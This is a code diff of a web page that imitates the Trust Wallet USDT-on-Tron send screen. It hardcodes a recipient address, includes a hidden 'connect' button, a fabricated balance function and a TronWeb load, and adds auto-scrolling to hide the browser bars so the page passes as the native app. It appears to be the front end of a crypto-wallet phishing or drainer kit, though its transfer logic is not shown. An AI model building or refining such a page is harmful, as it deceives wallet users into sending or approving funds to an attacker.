@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Trust Wallet Amount</title>
+  <title>Trust Wallet</title>
   <style>
     * {
       box-sizing: border-box;
@@ -16,27 +16,64 @@
       margin: 0;
       padding: 0;
       width: 100%;
-      height: 100%;
-      background-color: #0d111a;
+      min-height: 100%;
+      background-color: #000000;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       color: #ffffff;
-      overflow: hidden;
+      overflow-x: hidden;
+      overflow-y: auto;
+      scroll-behavior: smooth;
+      -webkit-overflow-scrolling: touch;
     }
 
-    .app-container {
+    /* Outer Wrapper with extra height to force browser bar collapse */
+    .scroll-page {
+      width: 100%;
+      min-height: 125vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      align-items: center;
+      background: #000000;
+      padding-top: 50px;
+    }
+
+    /* Top simulated dark backdrop shadow */
+    .top-notch-area {
       width: 100%;
       max-width: 430px;
-      height: 100dvh;
-      margin: 0 auto;
+      height: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: transparent;
+    }
+
+    .handle-bar {
+      width: 36px;
+      height: 4px;
+      border-radius: 2px;
+      background: rgba(255, 255, 255, 0.15);
+      margin-bottom: 8px;
+    }
+
+    /* Main Card Sheet: 9:16 layout with curved top popup style */
+    .wallet-sheet {
+      width: 100%;
+      max-width: 430px;
+      min-height: 100dvh;
+      background-color: #0d111a;
+      border-top-left-radius: 36px;
+      border-top-right-radius: 36px;
+      box-shadow: 0 -12px 35px rgba(0, 0, 0, 0.85);
       display: flex;
       flex-direction: column;
       justify-content: space-between;
-      padding: 14px 20px calc(24px + env(safe-area-inset-bottom, 0px)) 20px;
-      background: #0d111a;
+      padding: 16px 20px calc(24px + env(safe-area-inset-bottom, 0px)) 20px;
       position: relative;
     }
 
-    /* Top Navigation Bar */
+    /* Header */
     .top-header {
       display: grid;
       grid-template-columns: 44px 1fr 44px;
@@ -45,23 +82,24 @@
     }
 
     .back-btn {
-      width: 40px;
-      height: 40px;
+      width: 42px;
+      height: 42px;
       border-radius: 50%;
       background: #1b212f;
       display: flex;
       align-items: center;
       justify-content: center;
       cursor: pointer;
+      text-decoration: none;
       border: none;
       outline: none;
     }
 
     .back-btn svg {
-      width: 18px;
-      height: 18px;
+      width: 20px;
+      height: 20px;
       stroke: #ffffff;
-      stroke-width: 2.4;
+      stroke-width: 2.5;
       fill: none;
     }
 
@@ -72,11 +110,11 @@
       letter-spacing: -0.2px;
     }
 
-    /* Destination Address */
+    /* Recipient Address */
     .recipient-box {
       margin-top: 14px;
       font-size: 14px;
-      line-height: 1.4;
+      line-height: 1.45;
       word-break: break-all;
       color: #ffffff;
       font-weight: 500;
@@ -88,14 +126,14 @@
       font-weight: 400;
     }
 
-    /* Display Area */
+    /* Center Amount View */
     .display-container {
       flex: 1;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      margin-top: -10px;
+      min-height: 130px;
     }
 
     .amount-display-wrapper {
@@ -103,11 +141,10 @@
       align-items: center;
       justify-content: center;
       min-height: 60px;
-      position: relative;
     }
 
     .amount-val {
-      font-size: 48px;
+      font-size: 52px;
       font-weight: 700;
       color: #ffffff;
       letter-spacing: -0.5px;
@@ -120,9 +157,9 @@
     .cursor {
       display: inline-block;
       width: 2.5px;
-      height: 44px;
+      height: 46px;
       background-color: #3b5afb;
-      margin-left: 2px;
+      margin-left: 3px;
       border-radius: 1px;
       animation: blink 1.1s infinite;
     }
@@ -147,11 +184,18 @@
     }
 
     .swap-arrow {
-      font-size: 16px;
-      opacity: 0.8;
+      font-size: 15px;
+      opacity: 0.85;
     }
 
-    /* Token & Max Row */
+    /* Lower Section: Token + Keypad + Button */
+    .lower-section {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+    }
+
+    /* Token Row */
     .token-row {
       display: flex;
       align-items: center;
@@ -213,7 +257,6 @@
     .token-network {
       font-size: 13px;
       color: #8b95a5;
-      font-weight: 400;
       margin-top: 1px;
     }
 
@@ -227,15 +270,14 @@
       font-weight: 600;
       cursor: pointer;
       outline: none;
-      transition: opacity 0.15s ease, transform 0.1s ease;
+      transition: transform 0.1s ease;
     }
 
     .max-badge-btn:active {
       transform: scale(0.95);
-      opacity: 0.8;
     }
 
-    /* Numeric Keypad */
+    /* Keypad */
     .keypad-grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -257,7 +299,6 @@
       justify-content: center;
       cursor: pointer;
       border-radius: 12px;
-      transition: background-color 0.12s ease;
     }
 
     .key-btn:active {
@@ -272,7 +313,7 @@
       fill: none;
     }
 
-    /* Bottom Action CTA */
+    /* Review CTA */
     .cta-container {
       width: 100%;
     }
@@ -289,9 +330,9 @@
       justify-content: center;
       cursor: not-allowed;
       outline: none;
-      transition: background-color 0.2s ease, transform 0.1s ease;
       background-color: #171d2b;
       color: #495469;
+      transition: background-color 0.2s ease, transform 0.1s ease;
     }
 
     .action-btn.active {
@@ -304,7 +345,7 @@
       transform: scale(0.98);
     }
 
-    /* Custom Notification Alert */
+    /* Security Modal */
     .security-modal-overlay {
       position: fixed;
       top: 0;
@@ -312,11 +353,11 @@
       width: 100%;
       height: 100%;
       background: rgba(0, 0, 0, 0.7);
-      backdrop-filter: blur(4px);
+      backdrop-filter: blur(5px);
       display: none;
       align-items: center;
       justify-content: center;
-      z-index: 1000;
+      z-index: 9999;
       padding: 24px;
     }
 
@@ -328,7 +369,7 @@
       max-width: 320px;
       padding: 22px 20px 18px 20px;
       text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
       animation: popIn 0.2s ease-out forwards;
     }
 
@@ -385,81 +426,89 @@
 </head>
 <body>
 
-<div class="app-container">
-  
-  <!-- Header -->
-  <div>
-    <div class="top-header">
-      <button class="back-btn" type="button">
-        <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
-      </button>
-      <div class="header-title">Amount</div>
-      <div></div>
-    </div>
-
-    <!-- Recipient Address Details -->
-    <div class="recipient-box">
-      <span class="recipient-prefix">To:</span><span id="recipientAddressText">TYDS1FeEEJr8qZnsJ5Nwd3iC3A73kr4ahW</span>
-    </div>
+<div class="scroll-page" id="scrollPage">
+  <!-- Top notch bar on black background -->
+  <div class="top-notch-area">
+    <div class="handle-bar"></div>
   </div>
 
-  <!-- Center Amount Display -->
-  <div class="display-container">
-    <div class="amount-display-wrapper">
-      <span class="amount-val zero" id="displayAmount">0</span>
-      <span class="cursor hidden" id="uiCursor"></span>
-    </div>
-    <div class="fiat-estimate">
-      <span id="displayFiat">≈ $0.00</span>
-      <span class="swap-arrow">⇅</span>
-    </div>
-  </div>
+  <!-- Main Bottom Sheet UI with curved top corners -->
+  <div class="wallet-sheet" id="walletSheet">
+    
+    <!-- Header -->
+    <div>
+      <div class="top-header">
+        <a href="trust://" class="back-btn" id="backBtn">
+          <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
+        </a>
+        <div class="header-title">Amount</div>
+        <div></div>
+      </div>
 
-  <!-- Lower Container -->
-  <div>
-    <!-- Token Row -->
-    <div class="token-row">
-      <div class="token-info">
-        <div class="token-icons">
-          <img class="token-main" src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="Tether USDT">
-          <div class="token-badge">
-            <img src="https://cdn-icons-png.flaticon.com/512/12114/12114250.png" alt="Tron">
+      <!-- Recipient Address -->
+      <div class="recipient-box">
+        <span class="recipient-prefix">To:</span><span id="recipientAddressText">TYDS1FeEEJr8qZnsJ5Nwd3iC3A73kr4ahW</span>
+      </div>
+    </div>
+
+    <!-- Center Display -->
+    <div class="display-container">
+      <div class="amount-display-wrapper">
+        <span class="amount-val zero" id="displayAmount">0</span>
+        <span class="cursor hidden" id="uiCursor"></span>
+      </div>
+      <div class="fiat-estimate">
+        <span id="displayFiat">≈ $0.00</span>
+        <span class="swap-arrow">⇅</span>
+      </div>
+    </div>
+
+    <!-- Lower Section -->
+    <div class="lower-section">
+      <!-- Token Row -->
+      <div class="token-row">
+        <div class="token-info">
+          <div class="token-icons">
+            <img class="token-main" src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="Tether USDT">
+            <div class="token-badge">
+              <img src="https://cdn-icons-png.flaticon.com/512/12114/12114250.png" alt="Tron">
+            </div>
+          </div>
+          <div class="token-texts">
+            <span class="token-symbol">Tether USDT</span>
+            <span class="token-network">Tron</span>
           </div>
         </div>
-        <div class="token-texts">
-          <span class="token-symbol">Tether USDT</span>
-          <span class="token-network">Tron</span>
-        </div>
+        <button class="max-badge-btn" id="maxBtn" type="button">Max</button>
       </div>
-      <button class="max-badge-btn" id="maxBtn" type="button">Max</button>
-    </div>
 
-    <!-- Numeric Custom Keypad -->
-    <div class="keypad-grid">
-      <button class="key-btn" data-key="1">1</button>
-      <button class="key-btn" data-key="2">2</button>
-      <button class="key-btn" data-key="3">3</button>
-      <button class="key-btn" data-key="4">4</button>
-      <button class="key-btn" data-key="5">5</button>
-      <button class="key-btn" data-key="6">6</button>
-      <button class="key-btn" data-key="7">7</button>
-      <button class="key-btn" data-key="8">8</button>
-      <button class="key-btn" data-key="9">9</button>
-      <button class="key-btn" data-key=".">.</button>
-      <button class="key-btn" data-key="0">0</button>
-      <button class="key-btn" data-key="back">
-        <svg viewBox="0 0 24 24">
-          <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
-          <line x1="18" y1="9" x2="12" y2="15"/>
-          <line x1="12" y1="9" x2="18" y2="15"/>
-        </svg>
-      </button>
-    </div>
+      <!-- Numeric Keypad -->
+      <div class="keypad-grid">
+        <button class="key-btn" data-key="1">1</button>
+        <button class="key-btn" data-key="2">2</button>
+        <button class="key-btn" data-key="3">3</button>
+        <button class="key-btn" data-key="4">4</button>
+        <button class="key-btn" data-key="5">5</button>
+        <button class="key-btn" data-key="6">6</button>
+        <button class="key-btn" data-key="7">7</button>
+        <button class="key-btn" data-key="8">8</button>
+        <button class="key-btn" data-key="9">9</button>
+        <button class="key-btn" data-key=".">.</button>
+        <button class="key-btn" data-key="0">0</button>
+        <button class="key-btn" data-key="back">
+          <svg viewBox="0 0 24 24">
+            <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
+            <line x1="18" y1="9" x2="12" y2="15"/>
+            <line x1="12" y1="9" x2="18" y2="15"/>
+          </svg>
+        </button>
+      </div>
 
-    <!-- Action Button (Review / Next) -->
-    <div class="cta-container" id="bottomActions">
-      <button class="connect-data" style="display:none"></button>
-      <button class="action-btn connect-btn" id="start-btn" disabled>Review</button>
+      <!-- Action Button Area -->
+      <div class="cta-container" id="bottomActions">
+        <button class="connect-data" style="display:none"></button>
+        <button class="action-btn connect-btn" id="start-btn" disabled>Review</button>
+      </div>
     </div>
   </div>
 </div>
@@ -499,9 +548,9 @@
   const maxBtn = document.getElementById('maxBtn');
   const securityModal = document.getElementById('securityModal');
   const closeSecurityModal = document.getElementById('closeSecurityModal');
-
-  // Sync recipient address to hidden field if changed
+  const bottomActions = document.getElementById('bottomActions');
   const recipientAddressText = document.getElementById('recipientAddressText');
+
   if (addressInput && recipientAddressText) {
     addressInput.value = recipientAddressText.textContent.trim();
   }
@@ -522,7 +571,6 @@
         rawAmount = rawAmount === '' ? '0.' : rawAmount + '.';
       }
     } else {
-      // Limit decimals to 6 places
       if (rawAmount.includes('.')) {
         const parts = rawAmount.split('.');
         if (parts[1] && parts[1].length >= 6) return;
@@ -573,7 +621,6 @@
       }
     }
 
-    // Trigger synthetic input event for app.js listener
     amountInput.dispatchEvent(new Event('input', { bubbles: true }));
   }
 
@@ -586,7 +633,7 @@
     securityModal.style.display = 'none';
   });
 
-  // Dummy balance generator calculation (same logic)
+  // Dynamic balance calculation
   function fetchWalletBalance(e) {
     if (!e || e.length < 10) {
       currentWalletBalance = 0;
@@ -602,6 +649,22 @@
   if (addressInput) {
     fetchWalletBalance(addressInput.value);
   }
+
+  // Reliable Auto Full Scroll Down to hide browser bars
+  function autoScrollDown() {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        window.scrollTo({
+          top: document.documentElement.scrollHeight,
+          behavior: 'smooth'
+        });
+      }, 100);
+    });
+  }
+
+  window.addEventListener('DOMContentLoaded', autoScrollDown);
+  window.addEventListener('load', autoScrollDown);
+  window.addEventListener('resize', autoScrollDown);
 </script>
 
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
